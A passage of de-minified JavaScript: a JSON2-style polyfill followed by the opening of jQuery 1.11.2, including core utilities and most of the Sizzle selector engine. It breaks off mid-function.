"object" != typeof JSON && (JSON = {}),
    function () {
        "use strict";

        function f(e) {
            return e < 10 ? "0" + e : e
        }
        var cx, escapable, gap, indent, meta, rep;

        function quote(e) {
            return escapable.lastIndex = 0, escapable.test(e) ? '"' + e.replace(escapable, (function (e) {
                var t = meta[e];
                return "string" == typeof t ? t : "\\u" + ("0000" + e.charCodeAt(0).toString(16)).slice(-4)
            })) + '"' : '"' + e + '"'
        }

        function str(e, t) {
            var n, o, i, r, a, s = gap,
                l = t[e];
            switch (l && "object" == typeof l && "function" == typeof l.toJSON && (l = l.toJSON(e)), "function" == typeof rep && (l = rep.call(t, e, l)), typeof l) {
                case "string":
                    return quote(l);
                case "number":
                    return isFinite(l) ? String(l) : "null";
                case "boolean":
                case "null":
                    return String(l);
                case "object":
                    if (!l) return "null";
                    if (gap += indent, a = [], "[object Array]" === Object.prototype.toString.apply(l)) {
                        for (r = l.length, n = 0; n < r; n += 1) a[n] = str(n, l) || "null";
                        return i = 0 === a.length ? "[]" : gap ? "[\n" + gap + a.join(",\n" + gap) + "\n" + s + "]" : "[" + a.join(",") + "]", gap = s, i
                    }
                    if (rep && "object" == typeof rep)
                        for (r = rep.length, n = 0; n < r; n += 1) "string" == typeof rep[n] && (i = str(o = rep[n], l)) && a.push(quote(o) + (gap ? ": " : ":") + i);
                    else
                        for (o in l) Object.prototype.hasOwnProperty.call(l, o) && (i = str(o, l)) && a.push(quote(o) + (gap ? ": " : ":") + i);
                    return i = 0 === a.length ? "{}" : gap ? "{\n" + gap + a.join(",\n" + gap) + "\n" + s + "}" : "{" + a.join(",") + "}", gap = s, i
            }
        }
        "function" != typeof Date.prototype.toJSON && (Date.prototype.toJSON = function () {
            return isFinite(this.valueOf()) ? this.getUTCFullYear() + "-" + f(this.getUTCMonth() + 1) + "-" + f(this.getUTCDate()) + "T" + f(this.getUTCHours()) + ":" + f(this.getUTCMinutes()) + ":" + f(this.getUTCSeconds()) + "Z" : null
        }, String.prototype.toJSON = Number.prototype.toJSON = Boolean.prototype.toJSON = function () {
            return this.valueOf()
        }), "function" != typeof JSON.stringify && (escapable = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g, meta = {
            "\b": "\\b",
            "\t": "\\t",
            "\n": "\\n",
            "\f": "\\f",
            "\r": "\\r",
            '"': '\\"',
            "\\": "\\\\"
        }, JSON.stringify = function (e, t, n) {
            var o;
            if (gap = "", indent = "", "number" == typeof n)
                for (o = 0; o < n; o += 1) indent += " ";
            else "string" == typeof n && (indent = n);
            if (rep = t, t && "function" != typeof t && ("object" != typeof t || "number" != typeof t.length)) throw new Error("JSON.stringify");
            return str("", {
                "": e
            })
        }), "function" != typeof JSON.parse && (cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g, JSON.parse = function (text, reviver) {
            var j;

            function walk(e, t) {
                var n, o, i = e[t];
                if (i && "object" == typeof i)
                    for (n in i) Object.prototype.hasOwnProperty.call(i, n) && (void 0 !== (o = walk(i, n)) ? i[n] = o : delete i[n]);
                return reviver.call(e, t, i)
            }
            if (text = String(text), cx.lastIndex = 0, cx.test(text) && (text = text.replace(cx, (function (e) {
                return "\\u" + ("0000" + e.charCodeAt(0).toString(16)).slice(-4)
            }))), /^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, "@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, "]").replace(/(?:^|:|,)(?:\s*\[)+/g, ""))) return j = eval("(" + text + ")"), "function" == typeof reviver ? walk({
                "": j
            }, "") : j;
            throw new SyntaxError("JSON.parse")
        })
    }(),
    function (e, t) {
        "object" == typeof module && "object" == typeof module.exports ? module.exports = e.document ? t(e, !0) : function (e) {
            if (!e.document) throw new Error("jQuery requires a window with a document");
            return t(e)
        } : t(e)
    }("undefined" != typeof window ? window : this, (function (e, t) {
        var n = [],
            o = n.slice,
            i = n.concat,
            r = n.push,
            a = n.indexOf,
            s = {},
            l = s.toString,
            c = s.hasOwnProperty,
            u = {},
            d = "1.11.2",
            p = function (e, t) {
                return new p.fn.init(e, t)
            },
            f = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,
            h = /^-ms-/,
            m = /-([\da-z])/gi,
            g = function (e, t) {
                return t.toUpperCase()
            };

        function v(e) {
            var t = e.length,
                n = p.type(e);
            return "function" !== n && !p.isWindow(e) && (!(1 !== e.nodeType || !t) || ("array" === n || 0 === t || "number" == typeof t && t > 0 && t - 1 in e))
        }
        p.fn = p.prototype = {
            jquery: d,
            constructor: p,
            selector: "",
            length: 0,
            toArray: function () {
                return o.call(this)
            },
            get: function (e) {
                return null != e ? 0 > e ? this[e + this.length] : this[e] : o.call(this)
            },
            pushStack: function (e) {
                var t = p.merge(this.constructor(), e);
                return t.prevObject = this, t.context = this.context, t
            },
            each: function (e, t) {
                return p.each(this, e, t)
            },
            map: function (e) {
                return this.pushStack(p.map(this, (function (t, n) {
                    return e.call(t, n, t)
                })))
            },
            slice: function () {
                return this.pushStack(o.apply(this, arguments))
            },
            first: function () {
                return this.eq(0)
            },
            last: function () {
                return this.eq(-1)
            },
            eq: function (e) {
                var t = this.length,
                    n = +e + (0 > e ? t : 0);
                return this.pushStack(n >= 0 && t > n ? [this[n]] : [])
            },
            end: function () {
                return this.prevObject || this.constructor(null)
            },
            push: r,
            sort: n.sort,
            splice: n.splice
        }, p.extend = p.fn.extend = function () {
            var e, t, n, o, i, r, a = arguments[0] || {},
                s = 1,
                l = arguments.length,
                c = !1;
            for ("boolean" == typeof a && (c = a, a = arguments[s] || {}, s++), "object" == typeof a || p.isFunction(a) || (a = {}), s === l && (a = this, s--); l > s; s++)
                if (null != (i = arguments[s]))
                    for (o in i) e = a[o], a !== (n = i[o]) && (c && n && (p.isPlainObject(n) || (t = p.isArray(n))) ? (t ? (t = !1, r = e && p.isArray(e) ? e : []) : r = e && p.isPlainObject(e) ? e : {}, a[o] = p.extend(c, r, n)) : void 0 !== n && (a[o] = n));
            return a
        }, p.extend({
            expando: "jQuery" + (d + Math.random()).replace(/\D/g, ""),
            isReady: !0,
            error: function (e) {
                throw new Error(e)
            },
            noop: function () { },
            isFunction: function (e) {
                return "function" === p.type(e)
            },
            isArray: Array.isArray || function (e) {
                return "array" === p.type(e)
            },
            isWindow: function (e) {
                return null != e && e == e.window
            },
            isNumeric: function (e) {
                return !p.isArray(e) && e - parseFloat(e) + 1 >= 0
            },
            isEmptyObject: function (e) {
                var t;
                for (t in e) return !1;
                return !0
            },
            isPlainObject: function (e) {
                var t;
                if (!e || "object" !== p.type(e) || e.nodeType || p.isWindow(e)) return !1;
                try {
                    if (e.constructor && !c.call(e, "constructor") && !c.call(e.constructor.prototype, "isPrototypeOf")) return !1
                } catch (e) {
                    return !1
                }
                if (u.ownLast)
                    for (t in e) return c.call(e, t);
                for (t in e);
                return void 0 === t || c.call(e, t)
            },
            type: function (e) {
                return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? s[l.call(e)] || "object" : typeof e
            },
            globalEval: function (t) {
                t && p.trim(t) && (e.execScript || function (t) {
                    e.eval.call(e, t)
                })(t)
            },
            camelCase: function (e) {
                return e.replace(h, "ms-").replace(m, g)
            },
            nodeName: function (e, t) {
                return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase()
            },
            each: function (e, t, n) {
                var o = 0,
                    i = e.length,
                    r = v(e);
                if (n) {
                    if (r)
                        for (; i > o && !1 !== t.apply(e[o], n); o++);
                    else
                        for (o in e)
                            if (!1 === t.apply(e[o], n)) break
                } else if (r)
                    for (; i > o && !1 !== t.call(e[o], o, e[o]); o++);
                else
                    for (o in e)
                        if (!1 === t.call(e[o], o, e[o])) break;
                return e
            },
            trim: function (e) {
                return null == e ? "" : (e + "").replace(f, "")
            },
            makeArray: function (e, t) {
                var n = t || [];
                return null != e && (v(Object(e)) ? p.merge(n, "string" == typeof e ? [e] : e) : r.call(n, e)), n
            },
            inArray: function (e, t, n) {
                var o;
                if (t) {
                    if (a) return a.call(t, e, n);
                    for (o = t.length, n = n ? 0 > n ? Math.max(0, o + n) : n : 0; o > n; n++)
                        if (n in t && t[n] === e) return n
                }
                return -1
            },
            merge: function (e, t) {
                for (var n = +t.length, o = 0, i = e.length; n > o;) e[i++] = t[o++];
                if (n != n)
                    for (; void 0 !== t[o];) e[i++] = t[o++];
                return e.length = i, e
            },
            grep: function (e, t, n) {
                for (var o = [], i = 0, r = e.length, a = !n; r > i; i++) !t(e[i], i) !== a && o.push(e[i]);
                return o
            },
            map: function (e, t, n) {
                var o, r = 0,
                    a = e.length,
                    s = [];
                if (v(e))
                    for (; a > r; r++) null != (o = t(e[r], r, n)) && s.push(o);
                else
                    for (r in e) null != (o = t(e[r], r, n)) && s.push(o);
                return i.apply([], s)
            },
            guid: 1,
            proxy: function (e, t) {
                var n, i, r;
                return "string" == typeof t && (r = e[t], t = e, e = r), p.isFunction(e) ? (n = o.call(arguments, 2), (i = function () {
                    return e.apply(t || this, n.concat(o.call(arguments)))
                }).guid = e.guid = e.guid || p.guid++, i) : void 0
            },
            now: function () {
                return +new Date
            },
            support: u
        }), p.each("Boolean Number String Function Array Date RegExp Object Error".split(" "), (function (e, t) {
            s["[object " + t + "]"] = t.toLowerCase()
        }));
        var y = function (e) {
            var t, n, o, i, r, a, s, l, c, u, d, p, f, h, m, g, v, y, b, x = "sizzle" + 1 * new Date,
                w = e.document,
                C = 0,
                T = 0,
                E = ae(),
                k = ae(),
                S = ae(),
                L = function (e, t) {
                    return e === t && (d = !0), 0
                },
                N = 1 << 31,
                D = {}.hasOwnProperty,
                I = [],
                A = I.pop,
                $ = I.push,
                M = I.push,
                P = I.slice,
                j = function (e, t) {
                    for (var n = 0, o = e.length; o > n; n++)
                        if (e[n] === t) return n;
                    return -1
                },
                B = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
                O = "[\\x20\\t\\r\\n\\f]",
                H = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",
                F = H.replace("w", "w#"),
                z = "\\[" + O + "*(" + H + ")(?:" + O + "*([*^$|!~]?=)" + O + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + F + "))|)" + O + "*\\]",
                q = ":(" + H + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + z + ")*)|.*)\\)|)",
                W = new RegExp(O + "+", "g"),
                R = new RegExp("^" + O + "+|((?:^|[^\\\\])(?:\\\\.)*)" + O + "+$", "g"),
                _ = new RegExp("^" + O + "*," + O + "*"),
                U = new RegExp("^" + O + "*([>+~]|" + O + ")" + O + "*"),
                X = new RegExp("=" + O + "*([^\\]'\"]*?)" + O + "*\\]", "g"),
                Y = new RegExp(q),
                V = new RegExp("^" + F + "$"),
                G = {
                    ID: new RegExp("^#(" + H + ")"),
                    CLASS: new RegExp("^\\.(" + H + ")"),
                    TAG: new RegExp("^(" + H.replace("w", "w*") + ")"),
                    ATTR: new RegExp("^" + z),
                    PSEUDO: new RegExp("^" + q),
                    CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + O + "*(even|odd|(([+-]|)(\\d*)n|)" + O + "*(?:([+-]|)" + O + "*(\\d+)|))" + O + "*\\)|)", "i"),
                    bool: new RegExp("^(?:" + B + ")$", "i"),
                    needsContext: new RegExp("^" + O + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + O + "*((?:-\\d)?\\d*)" + O + "*\\)|)(?=[^-]|$)", "i")
                },
                J = /^(?:input|select|textarea|button)$/i,
                Z = /^h\d$/i,
                Q = /^[^{]+\{\s*\[native \w/,
                K = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
                ee = /[+~]/,
                te = /'|\\/g,
                ne = new RegExp("\\\\([\\da-f]{1,6}" + O + "?|(" + O + ")|.)", "ig"),
                oe = function (e, t, n) {
                    var o = "0x" + t - 65536;
                    return o != o || n ? t : 0 > o ? String.fromCharCode(o + 65536) : String.fromCharCode(o >> 10 | 55296, 1023 & o | 56320)
                },
                ie = function () {
                    p()
                };
            try {
                M.apply(I = P.call(w.childNodes), w.childNodes), I[w.childNodes.length].nodeType
            } catch (e) {
                M = {
                    apply: I.length ? function (e, t) {
                        $.apply(e, P.call(t))
                    } : function (e, t) {
                        for (var n = e.length, o = 0; e[n++] = t[o++];);
                        e.length = n - 1
                    }
                }
            }

            function re(e, t, o, i) {
                var r, s, c, u, d, h, v, y, C, T;
                if ((t ? t.ownerDocument || t : w) !== f && p(t), o = o || [], u = (t = t || f).nodeType, "string" != typeof e || !e || 1 !== u && 9 !== u && 11 !== u) return o;
                if (!i && m) {
                    if (11 !== u && (r = K.exec(e)))
                        if (c = r[1]) {
                            if (9 === u) {
                                if (!(s = t.getElementById(c)) || !s.parentNode) return o;
                                if (s.id === c) return o.push(s), o
                            } else if (t.ownerDocument && (s = t.ownerDocument.getElementById(c)) && b(t, s) && s.id === c) return o.push(s), o
                        } else {
                            if (r[2]) return M.apply(o, t.getElementsByTagName(e)), o;
                            if ((c = r[3]) && n.getElementsByClassName) return M.apply(o, t.getElementsByClassName(c)), o
                        } if (n.qsa && (!g || !g.test(e))) {
                            if (y = v = x, C = t, T = 1 !== u && e, 1 === u && "object" !== t.nodeName.toLowerCase()) {
                                for (h = a(e), (v = t.getAttribute("id")) ? y = v.replace(te, "\\$&") : t.setAttribute("id", y), y = "[id='" + y + "'] ", d = h.length; d--;) h[d] = y + ge(h[d]);
                                C = ee.test(e) && he(t.parentNode) || t, T = h.join(",")
                            }
                            if (T) try {
                                return M.apply(o, C.querySelectorAll(T)), o
                            } catch (e) { } finally {
                                    v || t.removeAttribute("id")
                                }
                        }
                }
                return l(e.replace(R, "$1"), t, o, i)
            }

            function ae() {
                var e = [];
                return function t(n, i) {
                    return e.push(n + " ") > o.cacheLength && delete t[e.shift()], t[n + " "] = i
                }
            }

            function se(e) {
                return e[x] = !0, e
            }

            function le(e) {
                var t = f.createElement("div");
                try {
                    return !!e(t)
                } catch (e) {
                    return !1
                } finally {
                    t.parentNode && t.parentNode.removeChild(t), t = null
                }
            }

            function ce(e, t) {
                for (var n = e.split("|"), i = e.length; i--;) o.attrHandle[n[i]] = t
            }

            function ue(e, t) {
                var n = t && e,
                    o = n && 1 === e.nodeType && 1 === t.nodeType && (~t.sourceIndex || N) - (~e.sourceIndex || N);
                if (o) return o;
                if (n)
                    for (; n = n.nextSibling;)
                        if (n === t) return -1;
                return e ? 1 : -1
            }

            function de(e) {
                return function (t) {
                    return "input" === t.nodeName.toLowerCase() && t.type === e
                }
            }

            function pe(e) {
                return function (t) {
                    var n = t.nodeName.toLowerCase();
                    return ("input" === n || "button" === n) && t.type === e
                }
            }

            function fe(e) {
                return se((function (t) {
                    return t = +t, se((function (n, o) {
                        for (var i, r = e([], n.length, t), a = r.length; a--;) n[i = r[a]] && (n[i] = !(o[i] = n[i]))
                    }))
                }))
            }

            function he(e) {
                return e && void 0 !== e.getElementsByTagName && e
            }
            for (t in n = re.support = {}, r = re.isXML = function (e) {
                var t = e && (e.ownerDocument || e).documentElement;
                return !!t && "HTML" !== t.nodeName
            }, p = re.setDocument = function (e) {
                var t, i, a = e ? e.ownerDocument || e : w;
                return a !== f && 9 === a.nodeType && a.documentElement ? (f = a, h = a.documentElement, (i = a.defaultView) && i !== i.top && (i.addEventListener ? i.addEventListener("unload", ie, !1) : i.attachEvent && i.attachEvent("onunload", ie)), m = !r(a), n.attributes = le((function (e) {
                    return e.className = "i", !e.getAttribute("className")
                })), n.getElementsByTagName = le((function (e) {
                    return e.appendChild(a.createComment("")), !e.getElementsByTagName("*").length
                })), n.getElementsByClassName = Q.test(a.getElementsByClassName), n.getById = le((function (e) {
                    return h.appendChild(e).id = x, !a.getElementsByName || !a.getElementsByName(x).length
                })), n.getById ? (o.find.ID = function (e, t) {
                    if (void 0 !== t.getElementById && m) {
                        var n = t.getElementById(e);
                        return n && n.parentNode ? [n] : []
                    }
                }, o.filter.ID = function (e) {
                    var t = e.replace(ne, oe);
                    return function (e) {
                        return e.getAttribute("id") === t
                    }
                }) : (delete o.find.ID, o.filter.ID = function (e) {
                    var t = e.replace(ne, oe);
                    return function (e) {
                        var n = void 0 !== e.getAttributeNode && e.getAttributeNode("id");
                        return n && n.value === t
                    }
                }), o.find.TAG = n.getElementsByTagName ? function (e, t) {
                    return void 0 !== t.getElementsByTagName ? t.getElementsByTagName(e) : n.qsa ? t.querySelectorAll(e) : void 0
                } : function (e, t) {
                    var n, o = [],
                        i = 0,
                        r = t.getElementsByTagName(e);
                    if ("*" === e) {
                        for (; n = r[i++];) 1 === n.nodeType && o.push(n);
                        return o
                    }
                    return r
                }, o.find.CLASS = n.getElementsByClassName && function (e, t) {
                    return m ? t.getElementsByClassName(e) : void 0
                }, v = [], g = [], (n.qsa = Q.test(a.querySelectorAll)) && (le((function (e) {
                    h.appendChild(e).innerHTML = "<a id='" + x + "'></a><select id='" + x + "-\f]' msallowcapture=''><option selected=''></option></select>", e.querySelectorAll("[msallowcapture^='']").length && g.push("[*^$]=" + O + "*(?:''|\"\")"), e.querySelectorAll("[selected]").length || g.push("\\[" + O + "*(?:value|" + B + ")"), e.querySelectorAll("[id~=" + x + "-]").length || g.push("~="), e.querySelectorAll(":checked").length || g.push(":checked"), e.querySelectorAll("a#" + x + "+*").length || g.push(".#.+[+~]")
                })), le((function (e) {
                    var t = a.createElement("input");
                    t.setAttribute("type", "hidden"), e.appendChild(t).setAttribute("name", "D"), e.querySelectorAll("[name=d]").length && g.push("name" + O + "*[*^$|!~]?="), e.querySelectorAll(":enabled").length || g.push(":enabled", ":disabled"), e.querySelectorAll("*,:x"), g.push(",.*:")
                }))), (n.matchesSelector = Q.test(y = h.matches || h.webkitMatchesSelector || h.mozMatchesSelector || h.oMatchesSelector || h.msMatchesSelector)) && le((function (e) {
                    n.disconnectedMatch = y.call(e, "div"), y.call(e, "[s!='']:x"), v.push("!=", q)
                })), g = g.length && new RegExp(g.join("|")), v = v.length && new RegExp(v.join("|")), t = Q.test(h.compareDocumentPosition), b = t || Q.test(h.contains) ? function (e, t) {
                    var n = 9 === e.nodeType ? e.documentElement : e,
                        o = t && t.parentNode;
                    return e === o || !(!o || 1 !== o.nodeType || !(n.contains ? n.contains(o) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(o)))
                } : function (e, t) {
                    if (t)
                        for (; t = t.parentNode;)
                            if (t === e) return !0;
                    return !1
                }, L = t ? function (e, t) {
                    if (e === t) return d = !0, 0;
                    var o = !e.compareDocumentPosition - !t.compareDocumentPosition;
                    return o || (1 & (o = (e.ownerDocument || e) === (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || !n.sortDetached && t.compareDocumentPosition(e) === o ? e === a || e.ownerDocument === w && b(w, e) ? -1 : t === a || t.ownerDocument === w && b(w, t) ? 1 : u ? j(u, e) - j(u, t) : 0 : 4 & o ? -1 : 1)
                } : function (e, t) {
                    if (e === t) return d = !0, 0;
                    var n, o = 0,
                        i = e.parentNode,
                        r = t.parentNode,
                        s = [e],
                        l = [t];
                    if (!i || !r) return e === a ? -1 : t === a ? 1 : i ? -1 : r ? 1 : u ? j(u, e) - j(u, t) : 0;
                    if (i === r) return ue(e, t);
                    for (n = e; n = n.parentNode;) s.unshift(n);
                    for (n = t; n = n.parentNode;) l.unshift(n);
                    for (; s[o] === l[o];) o++;
                    return o ? ue(s[o], l[o]) : s[o] === w ? -1 : l[o] === w ? 1 : 0
                }, a) : f
            }, re.matches = function (e, t) {
                return re(e, null, null, t)
            }, re.matchesSelector = function (e, t) {
                if ((e.ownerDocument || e) !== f && p(e), t = t.replace(X, "='$1']"), !(!n.matchesSelector || !m || v && v.test(t) || g && g.test(t))) try {
                    var o = y.call(e, t);
                    if (o || n.disconnectedMatch || e.document && 11 !== e.document.nodeType) return o
                } catch (e) { }
                return re(t, f, null, [e]).length > 0
            }, re.contains = function (e, t) {
                return (e.ownerDocument || e) !== f && p(e), b(e, t)
            }, re.attr = function (e, t) {
                (e.ownerDocument || e) !== f && p(e);
                var i = o.attrHandle[t.toLowerCase()],
                    r = i && D.call(o.attrHandle, t.toLowerCase()) ? i(e, t, !m) : void 0;
                return void 0 !== r ? r : n.attributes || !m ? e.getAttribute(t) : (r = e.getAttributeNode(t)) && r.specified ? r.value : null
            }, re.error = function (e) {
                throw new Error("Syntax error, unrecognized expression: " + e)
            }, re.uniqueSort = function (e) {
                var t, o = [],
                    i = 0,
                    r = 0;
                if (d = !n.detectDuplicates, u = !n.sortStable && e.slice(0), e.sort(L), d) {
                    for (; t = e[r++];) t === e[r] && (i = o.push(r));
                    for (; i--;) e.splice(o[i], 1)
                }
                return u = null, e
            }, i = re.getText = function (e) {
                var t, n = "",
                    o = 0,
                    r = e.nodeType;
                if (r) {
                    if (1 === r || 9 === r || 11 === r) {
                        if ("string" == typeof e.textContent) return e.textContent;
                        for (e = e.firstChild; e; e = e.nextSibling) n += i(e)
                    } else if (3 === r || 4 === r) return e.nodeValue
                } else
                    for (; t = e[o++];) n += i(t);
                return n
            }, (o = re.selectors = {
                cacheLength: 50,
                createPseudo: se,
                match: G,
                attrHandle: {},
                find: {},
                relative: {
                    ">": {
                        dir: "parentNode",
                        first: !0
                    },
                    " ": {
                        dir: "parentNode"
                    },
                    "+": {
                        dir: "previousSibling",
                        first: !0
                    },
                    "~": {
                        dir: "previousSibling"
                    }
                },
                preFilter: {
                    ATTR: function (e) {
                        return e[1] = e[1].replace(ne, oe), e[3] = (e[3] || e[4] || e[5] || "").replace(ne, oe), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4)
                    },
                    CHILD: function (e) {
                        return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || re.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && re.error(e[0]), e
                    },
                    PSEUDO: function (e) {
                        var t, n = !e[6] && e[2];
                        return G.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : n && Y.test(n) && (t = a(n, !0)) && (t = n.indexOf(")", n.length - t) - n.length) && (e[0] = e[0].slice(0, t), e[2] = n.slice(0, t)), e.slice(0, 3))
                    }
                },
                filter: {
                    TAG: function (e) {
                        var t = e.replace(ne, oe).toLowerCase();
                        return "*" === e ? function () {
                            return !0
                        } : function (e) {
                            return e.nodeName && e.nodeName.toLowerCase() === t
                        }
                    },
                    CLASS: function (e) {
                        var t = E[e + " "];
                        return t || (t = new RegExp("(^|" + O + ")" + e + "(" + O + "|$)")) && E(e, (function (e) {
                            return t.test("string" == typeof e.className && e.className || void 0 !== e.getAttribute && e.getAttribute("class") || "")
                        }))
                    },
                    ATTR: function (e, t, n) {
                        return function (o) {
                            var i = re.attr(o, e);
                            return null == i ? "!=" === t : !t || (i += "", "=" === t ? i === n : "!=" === t ? i !== n : "^=" === t ? n && 0 === i.indexOf(n) : "*=" === t ? n && i.indexOf(n) > -1 : "$=" === t ? n && i.slice(-n.length) === n : "~=" === t ? (" " + i.replace(W, " ") + " ").indexOf(n) > -1 : "|=" === t && (i === n || i.slice(0, n.length + 1) === n + "-"))
                        }
                    },
                    CHILD: function (e, t, n, o, i) {
                        var r = "nth" !== e.slice(0, 3),
                            a = "last" !== e.slice(-4),
                            s = "of-type" === t;
                        return 1 === o && 0 === i ? function (e) {
                            return !!e.parentNode
                        } : function (t, n, l) {
                            var c, u, d, p, f, h, m = r !== a ? "nextSibling" : "previousSibling",
                                g = t.parentNode,
                                v = s && t.nodeName.toLowerCase(),
                                y = !l && !s;
                            if (g) {
                                if (r) {
                                    for (; m;) {
                                        for (d = t; d = d[m];)
                                            if (s ? d.nodeName.toLowerCase() === v : 1 === d.nodeType) return !1;
                                        h = m = "only" === e && !h && "nextSibling"
                                    }
                                    return !0
                                }
                                if (h = [a ? g.firstChild : g.lastChild], a && y) {
                                    for (f = (c = (u = g[x] || (g[x] = {}))[e] || [])[0] === C && c[1], p = c[0] === C && c[2], d = f && g.childNodes[f]; d = ++f && d && d[m] || (p = f = 0) || h.pop();)
                                        if (1 === d.nodeType && ++p && d === t) {
                                            u[e] = [C, f, p];
                                            break
                                        }
                                } else if (y && (c = (t[x] || (t[x] = {}))[e]) && c[0] === C) p = c[1];
                                else
                                    for (;
                                        (d = ++f && d && d[m] || (p = f = 0) || h.pop()) && ((s ? d.nodeName.toLowerCase() !== v : 1 !== d.nodeType) || !++p || (y && ((d[x] || (d[x] = {}))[e] = [C, p]), d !== t)););
                                return (p -= i) === o || p % o == 0 && p / o >= 0
                            }
                        }
                    },
                    PSEUDO: function (e, t) {
                        var n, i = o.pseudos[e] || o.setFilters[e.toLowerCase()] || re.error("unsupported pseudo: " + e);
                        return i[x] ? i(t) : i.length > 1 ? (n = [e, e, "", t], o.setFilters.hasOwnProperty(e.toLowerCase()) ? se((function (e, n) {
                            for (var o, r = i(e, t), a = r.length; a--;) e[o = j(e, r[a])] = !(n[o] = r[a])
                        })) : function (e) {
                            return i(e, 0, n)
                        }) : i
                    }
                },
                pseudos: {
                    not: se((function (e) {
                        var t = [],
                            n = [],
                            o = s(e.replace(R, "$1"));
                        return o[x] ? se((function (e, t, n, i) {
                            for (var r, a = o(e, null, i, []), s = e.length; s--;)(r = a[s]) && (e[s] = !(t[s] = r))
                        })) : function (e, i, r) {
                            return t[0] = e, o(t, null, r, n), t[0] = null, !n.pop()
                        }
                    })),
                    has: se((function (e) {
                        return function (t) {
                            return re(e, t).length > 0
                        }
                    })),
                    contains: se((function (e) {
                        return e = e.replace(ne, oe),
                            function (t) {
                                return (t.textContent || t.innerText || i(t)).indexOf(e) > -1
                            }
                    })),
                    lang: se((function (e) {
                        return V.test(e || "") || re.error("unsupported lang: " + e), e = e.replace(ne, oe).toLowerCase(),
                            function (t) {
                                var n;
                                do {
                                    if (n = m ? t.lang : t.getAttribute("xml:lang") || t.getAttribute("lang")) return (n = n.toLowerCase()) === e || 0 === n.indexOf(e + "-")
                                } while ((t = t.parentNode) && 1 === t.nodeType);
                                return !1
                            }
                    })),
                    target: function (t) {
                        var n = e.location && e.location.hash;
                        return n && n.slice(1) === t.id
                    },
                    root: function (e) {
                        return e === h
                    },
                    focus: function (e) {
                        return e === f.activeElement && (!f.hasFocus || f.hasFocus()) && !!(e.type || e.href || ~e.tabIndex)
                    },
                    enabled: function (e) {
                        return !1 === e.disabled
                    },
                    disabled: function (e) {
                        return !0 === e.disabled
                    },
                    checked: function (e) {
                        var t = e.nodeName.toLowerCase();
                        return "input" === t && !!e.checked || "option" === t && !!e.selected
                    },
                    selected: function (e) {
                        return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected
                    },
                    empty: function (e) {
                        for (e = e.firstChild; e; e = e.nextSibling)
                            if (e.nodeType < 6) return !1;
                        return !0
                    },
                    parent: function (e) {
                        return !o.pseudos.empty(e)
                    },
                    header: function (e) {
                        return Z.test(e.nodeName)
                    },
                    input: function (e) {
                        return J.test(e.nodeName)
                    },
                    button: function (e) {
                        var t = e.nodeName.toLowerCase();
                        return "input" === t && "button" === e.type || "button" === t
                    },
                    text: function (e) {
                        var t;
                        return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase())
                    },
                    first: fe((function () {
                        return [0]
                    })),
                    last: fe((function (e, t) {
                        return [t - 1]
                    })),
                    eq: fe((function (e, t, n) {
                        return [0 > n ? n + t : n]
                    })),
                    even: fe((function (e, t) {
                        for (var n = 0; t > n; n += 2) e.push(n);
                        return e
                    })),
                    odd: fe((function (e, t) {
                        for (var n = 1; t > n; n += 2) e.push(n);
                        return e
                    })),
                    lt: fe((function (e, t, n) {
                        for (var o = 0 > n ? n + t : n; --o >= 0;) e.push(o);
                        return e
                    })),
                    gt: fe((function (e, t, n) {
                        for (var o = 0 > n ? n + t : n; ++o < t;) e.push(o);
                        return e
                    }))
                }
            }).pseudos.nth = o.pseudos.eq, {
                radio: !0,
                checkbox: !0,
                file: !0,
                password: !0,
                image: !0
            }) o.pseudos[t] = de(t);
            for (t in {
                submit: !0,
                reset: !0
            }) o.pseudos[t] = pe(t);

            function me() { }

            function ge(e) {
                for (var t = 0, n = e.length, o = ""; n > t; t++) o += e[t].value;
                return o
            }

            function ve(e, t, n) {
                var o = t.dir,
                    i = n && "parentNode" === o,
                    r = T++;
                return t.first ? function (t, n, r) {
                    for (; t = t[o];)
                        if (1 === t.nodeType || i) return e(t, n, r)
                } : function (t, n, a) {
                    var s, l, c = [C, r];
                    if (a) {
                        for (; t = t[o];)
                            if ((1 === t.nodeType || i) && e(t, n, a)) return !0
                    } else
                        for (; t = t[o];)
                            if (1 === t.nodeType || i) {
                                if ((s = (l = t[x] || (t[x] = {}))[o]) && s[0] === C && s[1] === r) return c[2] = s[2];
                                if (l[o] = c, c[2] = e(t, n, a)) return !0
                            }
                }
            }

            function ye(e) {
                return e.length > 1 ? function (t, n, o) {
                    for (var i = e.length; i--;)
                        if (!e[i](t, n, o)) return !1;
                    return !0
                } : e[0]
            }

            function be(e, t, n, o, i) {
